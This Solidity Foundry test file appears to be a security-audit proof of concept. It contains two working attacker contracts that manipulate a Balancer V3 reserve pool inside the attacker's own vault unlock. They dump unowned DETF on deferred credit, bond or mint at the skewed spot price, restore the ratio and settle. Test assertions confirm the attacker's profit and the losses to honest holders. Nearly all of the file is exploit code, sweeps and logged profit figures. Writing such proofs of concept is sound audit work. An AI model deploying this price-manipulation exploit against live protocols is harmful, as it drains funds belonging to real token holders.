// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IVault} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/IVault.sol";
import {SwapKind, VaultSwapParams} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/VaultTypes.sol";
import {IDetfBondNFT} from "contracts/interfaces/IDetfBondNFT.sol";
import {
    TestBase_SingleStandardExchangeDETF
} from "contracts/vaults/detf/protocols/dexes/balancer/v3/standardExchange/single/TestBase_SingleStandardExchangeDETF.sol";
import {ISingleStandardExchangeDETFBonding} from
    "contracts/vaults/detf/protocols/dexes/balancer/v3/standardExchange/single/ISingleStandardExchangeDETFBonding.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {ISingleStandardExchangeDETFInfo} from
    "contracts/vaults/detf/protocols/dexes/balancer/v3/standardExchange/single/ISingleStandardExchangeDETFInfo.sol";

/// @notice Unprivileged attacker: opens its own Balancer V3 unlock, dumps DETF into the reserve pool on
///         deferred credit (no DETF inventory), bonds, then restores the pool ratio and settles all deltas.
interface IR2WPool { function getNormalizedWeights() external view returns (uint256[] memory); }

contract R2SseBondAttacker {
    IVault public immutable vault;
    address public immutable detf;
    address public immutable pool;
    IERC20 public immutable share;

    uint256 public dumpAmt;
    uint256 public bondAmt;
    uint256 public duration;
    uint256 public bondId;
    bool public sawUnlocked;

    constructor(IVault v_, address detf_, address pool_, IERC20 share_) {
        vault = v_; detf = detf_; pool = pool_; share = share_;
    }

    function _idx() internal view returns (uint256 di, uint256 si) {
        (IERC20[] memory t,,,) = vault.getPoolTokenInfo(pool);
        di = address(t[0]) == detf ? 0 : 1;
        si = 1 - di;
    }

    function raw() public view returns (uint256 d, uint256 s) {
        (,, uint256[] memory r,) = vault.getPoolTokenInfo(pool);
        (uint256 di, uint256 si) = _idx();
        return (r[di], r[si]);
    }

    function attack(uint256 dump_, uint256 bond_, uint256 duration_) external returns (uint256) {
        dumpAmt = dump_; bondAmt = bond_; duration = duration_;
        vault.unlock(abi.encodeCall(this.cb, ()));
        return bondId;
    }

    function _swap(SwapKind k, IERC20 i, IERC20 o, uint256 amt, uint256 lim) internal returns (uint256 inA, uint256 outA) {
        (, inA, outA) = vault.swap(VaultSwapParams({kind: k, pool: pool, tokenIn: i, tokenOut: o,
            amountGivenRaw: amt, limitRaw: lim, userData: ""}));
    }

    /// @dev Revert-to-quote probe: ratio after buying back DETF with `inS` shares.
    function probe(uint256 inS) external {
        require(msg.sender == address(this));
        _swap(SwapKind.EXACT_IN, share, IERC20(detf), inS, 0);
        (uint256 d, uint256 s) = raw();
        bytes memory r = abi.encode(d, s);
        assembly { revert(add(r, 32), mload(r)) }
    }

    function _probe(uint256 inS) internal returns (uint256 d, uint256 s) {
        try this.probe(inS) {} catch (bytes memory r) { if (r.length == 64) (d, s) = abi.decode(r, (uint256, uint256)); }
    }

    uint256 internal d0s; uint256 internal s0s; uint256 internal shareOutS; uint256 internal hiS;

    uint256 internal detfBackS;

    function _cheap(uint256 d, uint256 s) internal view returns (bool) { return d * s0s > d0s * s; }

    /// @dev Restore d/s to the pre-attack ratio with as many <=29% chunks as Balancer's MaxInRatio needs.
    function _restore() internal {
        for (uint256 k; k < 12; ++k) {
            (, uint256 sNow) = raw();
            uint256 cap = sNow * 29 / 100;
            (uint256 dc, uint256 sc) = _probe(cap);
            if (dc != 0 && _cheap(dc, sc)) {
                (, uint256 o) = _swap(SwapKind.EXACT_IN, share, IERC20(detf), cap, 0);
                hiS += cap; detfBackS += o;
                continue;
            }
            uint256 lo = 0; uint256 hi = cap;
            for (uint256 i; i < 200 && hi - lo > 1; ++i) {
                uint256 mid = (lo + hi) / 2;
                (uint256 d, uint256 s2) = _probe(mid);
                if (d != 0 && _cheap(d, s2)) lo = mid; else hi = mid;
            }
            (, uint256 o2) = _swap(SwapKind.EXACT_IN, share, IERC20(detf), hi, 0);
            hiS += hi; detfBackS += o2;
            break;
        }
        (uint256 df, uint256 sf) = raw();
        console2.log("restored d/s", df, sf);
    }

    function _settleDetf(uint256 detfBack) internal {
        if (detfBack >= dumpAmt) {
            vault.sendTo(IERC20(detf), address(this), detfBack - dumpAmt);
        } else {
            uint256 owe = dumpAmt - detfBack;
            IERC20(detf).transfer(address(vault), owe);
            vault.settle(IERC20(detf), owe);
        }
    }

    function _settleShare() internal {
        if (shareOutS >= hiS) {
            vault.sendTo(share, address(this), shareOutS - hiS);
        } else {
            uint256 owe2 = hiS - shareOutS;
            share.transfer(address(vault), owe2);
            vault.settle(share, owe2);
        }
    }

    function cb() external returns (bytes memory) {
        require(msg.sender == address(vault));
        sawUnlocked = vault.isUnlocked();
        (d0s, s0s) = raw();
        // 1. dump DETF the attacker does not own: deferred DETF debt, share credit.
        (, shareOutS) = _swap(SwapKind.EXACT_IN, IERC20(detf), share, dumpAmt, 0);
        console2.log("dump", dumpAmt, "shareOut", shareOutS);
        { (uint256 dd, uint256 ss) = raw(); console2.log("after dump d/s", dd, ss); }
        // 2. bond with own shares at the manipulated spot.
        share.approve(detf, bondAmt);
        (bondId,) = ISingleStandardExchangeDETFBonding(detf).bond(share, bondAmt, duration, address(this), false, block.timestamp + 1);
        { (uint256 dd, uint256 ss) = raw(); console2.log("after bond d/s", dd, ss); }
        // 3. restore ratio d/s == d0/s0
        _restore();
        // 4. settle all deltas
        _settleDetf(detfBackS);
        _settleShare();
        return "";
    }

    function honestBond(uint256 bond_, uint256 duration_) external returns (uint256 id) {
        share.approve(detf, bond_);
        (id,) = ISingleStandardExchangeDETFBonding(detf).bond(share, bond_, duration_, address(this), false, block.timestamp + 1);
        bondId = id;
    }

    function claim(IDetfBondNFT nft, uint256 id) external returns (uint256 p, uint256 r) {
        (p, r) = nft.claimBond(id, address(this));
        // bond pays sDETF: unstake 1:1 to DETF through the DETF's public staking route
        IERC20 st = IERC20(ISingleStandardExchangeDETFInfo(detf).rebasingClaimToken());
        uint256 b = st.balanceOf(address(this));
        if (b > 0) {
            st.approve(detf, b);IStandardExchangeIn(detf).exchangeIn(st, b, IERC20(detf), 0, address(this), false, block.timestamp + 1);
        }
    }

    // sell all DETF for shares via own unlock (realization)
    uint256 internal sellAmt;
    function sellAll() external {
        sellAmt = IERC20(detf).balanceOf(address(this));
        if (sellAmt == 0) return;
        vault.unlock(abi.encodeCall(this.sellCb, ()));
    }
    function sellCb() external returns (bytes memory) {
        require(msg.sender == address(vault));
        uint256 out; uint256 left = sellAmt;
        while (left > 0) {
            (uint256 dNow,) = raw(); uint256 c = dNow * 29 / 100; if (c > left) c = left;
            (, uint256 o) = _swap(SwapKind.EXACT_IN, IERC20(detf), share, c, 0); out += o; left -= c;
        }
        IERC20(detf).transfer(address(vault), sellAmt);
        vault.settle(IERC20(detf), sellAmt);
        vault.sendTo(share, address(this), out);
        return "";
    }
}

contract R2_SingleSE_BondTest is TestBase_SingleStandardExchangeDETF {
    R2SseBondAttacker internal atk;
    address internal rpool;
    IDetfBondNFT internal nft;
    address internal attackerEOA = address(0xA77AC4);
    uint256 internal constant BOND = 30e18;

    function setUp() public virtual override {
        super.setUp();
        // honest bootstrap + an honest second bonder (victims)
        _bootstrapViaFirstBond(alice, 1_000e18);
        uint256 s_ = _fundSeShares(bob, 100e18);
        vm.startPrank(bob);
        seShare.approve(detf, s_);
        detfBonding.bond(seShare, s_, DEFAULT_MAX_LOCK, bob, false, block.timestamp + 1 hours);
        vm.stopPrank();
        rpool = ISingleStandardExchangeDETFInfo(detf).reservePool();
        nft = IDetfBondNFT(ISingleStandardExchangeDETFInfo(detf).bondNftVault());
        atk = new R2SseBondAttacker(IVault(address(vault)), detf, rpool, seShare);
        // attacker capital: honest SE deposit, counted as cost
        uint256 got_ = _fundSeShares(address(this), 120e18);
        seShare.transfer(address(atk), got_);
    }

    function _shareVal(uint256 detfAmt) internal view returns (uint256) {
        (uint256 d, uint256 s) = atk.raw();
        (IERC20[] memory t,,,) = IVault(address(vault)).getPoolTokenInfo(rpool);
        uint256[] memory w = IR2WPool(rpool).getNormalizedWeights();
        (uint256 wd, uint256 ws) = address(t[0]) == detf ? (w[0], w[1]) : (w[1], w[0]);
        // weighted spot (share per DETF raw unit) = (s/ws)/(d/wd); seShare rate provider ignored (constant within test)
        return detfAmt * s * wd / (d * ws);
    }

    uint256 internal sh0;
    uint256 internal poolShareEnd;

    function _logState(bool sandwich, uint256 id) internal view returns (uint256 principal) {
        (uint256 d1, uint256 s1) = atk.raw();
        principal = nft.positionOf(id).principal;
        console2.log(sandwich ? "== SANDWICH ==" : "== HONEST ==");
        console2.log("  vault unlocked during bond:", atk.sawUnlocked());
        console2.log("  pool d/s after ", d1, s1);
        console2.log("  principal DETF", principal);
        console2.log("  attacker loose DETF", IERC20(detf).balanceOf(address(atk)));
        int256 shareDelta = int256(seShare.balanceOf(address(atk))) - int256(sh0);
        console2.log("  attacker share delta (signed):");
        console2.logInt(shareDelta);
        uint256 v = _shareVal(principal + IERC20(detf).balanceOf(address(atk)));
        console2.log("  spot share value of principal+loose", v);
        console2.log("  spot PnL (signed):");
        console2.logInt(int256(v) + shareDelta);
    }

    function _run(uint256 dumpPct, bool sandwich) internal returns (int256 realized, uint256 principal) {
        (uint256 d0, uint256 s0) = atk.raw();
        console2.log("  pool d/s before", d0, s0);
        sh0 = seShare.balanceOf(address(atk));
        console2.log("  DETF supply before", IERC20(detf).totalSupply());
        vm.startPrank(attackerEOA, attackerEOA);
        uint256 id = sandwich ? atk.attack(d0 * dumpPct / 100, BOND, DEFAULT_MAX_LOCK) : atk.honestBond(BOND, DEFAULT_MAX_LOCK);
        vm.stopPrank();
        console2.log("  DETF supply after", IERC20(detf).totalSupply());
        principal = _logState(sandwich, id);
        _warpPastUnlock(detf, id);
        vm.startPrank(attackerEOA, attackerEOA);
        atk.claim(nft, id);
        atk.sellAll();
        vm.stopPrank();
        realized = int256(seShare.balanceOf(address(atk))) - int256(sh0);
        console2.log("  REALIZED share PnL after lock + dump (signed):");
        console2.logInt(realized);
        console2.log("  attacker DETF after claim+sell", IERC20(detf).balanceOf(address(atk)));
        (uint256 dE, uint256 sE) = atk.raw();
        poolShareEnd = sE;
        console2.log("  END pool d/s (real share leg backing DETF holders)", dE, sE);
        console2.log("  END DETF supply", IERC20(detf).totalSupply());
        console2.log("  synthetic price after", ISingleStandardExchangeDETFInfo(detf).syntheticPrice());
    }

    function test_honest() public { _run(0, false); }

    function test_sandOnly() public { _run(25, true); }

    function test_sandwich25() public {
        uint256 snap = vm.snapshotState();
        (int256 rh, uint256 ph) = _run(0, false);
        uint256 shareEndHonest = poolShareEnd;
        vm.revertToState(snap);
        (int256 rs, uint256 ps) = _run(25, true);
        console2.log("principal honest / sandwich", ph, ps);
        console2.logInt(rh); console2.logInt(rs);
        uint256 shareEndSand = poolShareEnd;
        console2.log("pool share leg end honest / sandwich", shareEndHonest, shareEndSand);
        assertTrue(atk.sawUnlocked(), "bond executed while Balancer vault unlocked by attacker");
        assertGt(ps, ph * 2, "principal inflated >2x");
        assertLt(rh, 1e18, "honest bond+exit ~ break-even");
        assertGt(rs, 50e18, "attacker realized >50 shares net profit after lock");
        assertGt(shareEndHonest, shareEndSand + 50e18, "reserve share leg (DETF holders' backing) lost >50 shares");
    }

    function test_sandwich10() public {
        uint256 snap = vm.snapshotState();
        (int256 rh, uint256 ph) = _run(0, false);
        vm.revertToState(snap);
        (int256 rs, uint256 ps) = _run(10, true);
        console2.log("principal honest / sandwich", ph, ps);
        console2.logInt(rh); console2.logInt(rs);
    }
}

/// @notice Unprivileged attacker for the SingleSE MINT path: inside its own Balancer unlock it dumps DETF it does
///         not own into the 2-token weighted reserve pool (chunks under MaxInRatio), calls exchangeIn(share->DETF)
///         which mints the live spot quote, buys back exactly the dumped DETF (EXACT_OUT), and settles net share delta.
contract R2SseMintAttacker {
    IVault public immutable v;
    address public immutable detf;
    address public immutable pool;
    IERC20 public immutable share;
    uint256 public minted;
    bool public sawUnlocked;
    uint256 internal skew; uint256 internal pay; bool internal doMint;

    constructor(IVault v_, address detf_, address pool_, IERC20 share_) { v = v_; detf = detf_; pool = pool_; share = share_; }

    function _bal(IERC20 t) internal view returns (uint256) {
        (IERC20[] memory ts,, uint256[] memory r,) = v.getPoolTokenInfo(pool);
        return address(ts[0]) == address(t) ? r[0] : r[1];
    }

    function attack(uint256 skew_, uint256 pay_, bool doMint_) external {
        skew = skew_; pay = pay_; doMint = doMint_;
        v.unlock(abi.encodeCall(this.cb, ()));
    }

    function cb() external returns (bytes memory) {
        require(msg.sender == address(v));
        sawUnlocked = v.isUnlocked();
        int256 shareDelta;
        uint256 left = skew;
        while (left > 0) {
            uint256 c = _bal(IERC20(detf)) * 29 / 100; if (c > left) c = left;
            (,, uint256 o) = v.swap(VaultSwapParams(SwapKind.EXACT_IN, pool, IERC20(detf), share, c, 0, ""));
            shareDelta += int256(o); left -= c;
        }
        if (doMint) {
            share.approve(detf, pay);minted = IStandardExchangeIn(detf).exchangeIn(share, pay, IERC20(detf), 0, address(this), false, block.timestamp + 1);
        }
        left = skew;
        while (left > 0) {
            uint256 c = _bal(IERC20(detf)) * 29 / 100; if (c > left) c = left;
            (, uint256 i2,) = v.swap(VaultSwapParams(SwapKind.EXACT_OUT, pool, share, IERC20(detf), c, type(uint256).max, ""));
            shareDelta -= int256(i2); left -= c;
        }
        if (shareDelta > 0) v.sendTo(share, address(this), uint256(shareDelta));
        else if (shareDelta < 0) { share.transfer(address(v), uint256(-shareDelta)); v.settle(share, uint256(-shareDelta)); }
        return "";
    }

    function sellAll() external {
        if (IERC20(detf).balanceOf(address(this)) == 0) return;
        v.unlock(abi.encodeCall(this.sellCb, ()));
    }

    function sellCb() external returns (bytes memory) {
        require(msg.sender == address(v));
        uint256 bal = IERC20(detf).balanceOf(address(this));
        uint256 left = bal; uint256 out;
        while (left > 0) {
            uint256 c = _bal(IERC20(detf)) * 29 / 100; if (c > left) c = left;
            (,, uint256 o) = v.swap(VaultSwapParams(SwapKind.EXACT_IN, pool, IERC20(detf), share, c, 0, ""));
            out += o; left -= c;
        }
        IERC20(detf).transfer(address(v), bal); v.settle(IERC20(detf), bal);
        v.sendTo(share, address(this), out);
        return "";
    }
}

contract R2_SingleSE_MintTest is TestBase_SingleStandardExchangeDETF {
    address internal rpool;

    function setUp() public virtual override {
        super.setUp();
        _bootstrapViaFirstBond(alice, 1_000e18);
        // honest holders mint DETF through the public route (victims: DETF holders)
        uint256 s_ = _fundSeShares(bob, 300e18);
        vm.startPrank(bob);
        seShare.approve(detf, s_);IStandardExchangeIn(detf).exchangeIn(seShare, s_, IERC20(detf), 0, bob, false, block.timestamp + 1);
        vm.stopPrank();
        rpool = ISingleStandardExchangeDETFInfo(detf).reservePool();
    }

    function _detfRaw() internal view returns (uint256) {
        (IERC20[] memory t,, uint256[] memory r,) = IVault(address(vault)).getPoolTokenInfo(rpool);
        return address(t[0]) == detf ? r[0] : r[1];
    }

    function _newAtk(uint256 lp) internal returns (R2SseMintAttacker a, uint256 start) {
        a = new R2SseMintAttacker(IVault(address(vault)), detf, rpool, seShare);
        start = _fundSeShares(address(this), lp);
        seShare.transfer(address(a), start);
    }

    function _run(uint256 skewX100, uint256 pay, bool doMint) internal returns (int256 pnl, uint256 minted, uint256 synthAfter) {
        uint256 snap = vm.snapshotState();
        (R2SseMintAttacker a, uint256 start) = _newAtk(2_000e18);
        uint256 supply0 = IERC20(detf).totalSupply();
        a.attack(_detfRaw() * skewX100 / 100, pay, doMint);
        minted = a.minted();
        uint256 supplyMid = IERC20(detf).totalSupply();
        a.sellAll();
        pnl = int256(seShare.balanceOf(address(a))) - int256(start);
        synthAfter = ISingleStandardExchangeDETFInfo(detf).syntheticPrice();
        emit log_named_uint("  skew (% of pool DETF)", skewX100);
        emit log_named_uint("  pay shares", pay);
        emit log_named_uint("  minted DETF", minted);
        emit log_named_uint("  supply delta", supplyMid - supply0);
        emit log_named_uint("  synth after", synthAfter);
        emit log_named_int("  ATTACKER NET PnL (shares)", pnl);
        vm.revertToState(snap);
    }

    function ext(uint256 k, uint256 pay, bool m) external returns (int256 p, uint256 mi, uint256 sy) {
        require(msg.sender == address(this));
        return _run(k, pay, m);
    }

    function test_sse_mint_sweep() public {
        emit log_named_uint("static fee", IVault(address(vault)).getStaticSwapFeePercentage(rpool));
        emit log_named_uint("synth0", ISingleStandardExchangeDETFInfo(detf).syntheticPrice());
        emit log_named_uint("mintThreshold", ISingleStandardExchangeDETFInfo(detf).mintThreshold());
        emit log_named_string("mint allowed", ISingleStandardExchangeDETFInfo(detf).isMintingAllowed() ? "yes" : "no");
        emit log_named_uint("pool DETF raw", _detfRaw());
        uint256[6] memory ks = [uint256(0), 50, 100, 300, 700, 1500];
        uint256[3] memory pays = [uint256(5e18), 50e18, 200e18];
        for (uint256 j; j < 3; ++j) for (uint256 i; i < ks.length; ++i) {
            try this.ext(ks[i], pays[j], true) {} catch (bytes memory e) { emit log_named_uint("REVERT skew", ks[i]); emit log_named_bytes("  err", e); }
        }
        for (uint256 i; i < ks.length; ++i) {
            emit log_named_uint("control no-mint round trip skew", ks[i]);
            try this.ext(ks[i], 0, false) {} catch (bytes memory e) { emit log_named_bytes("  err", e); }
        }
    }

    /// Variant: an instance deployed with a mint threshold below the post-bootstrap synthetic price (gate open).
    function test_sse_mint_openGate_sweep() public {
        detf = _deployPolicyThresholds(3e17, 1e17);
        _bootstrapViaFirstBond(alice, 1_000e18);
        uint256 s_ = _fundSeShares(bob, 300e18);
        vm.startPrank(bob);
        seShare.approve(detf, s_);IStandardExchangeIn(detf).exchangeIn(seShare, s_, IERC20(detf), 0, bob, false, block.timestamp + 1);
        vm.stopPrank();
        rpool = ISingleStandardExchangeDETFInfo(detf).reservePool();
        test_sse_mint_sweep();
    }
}
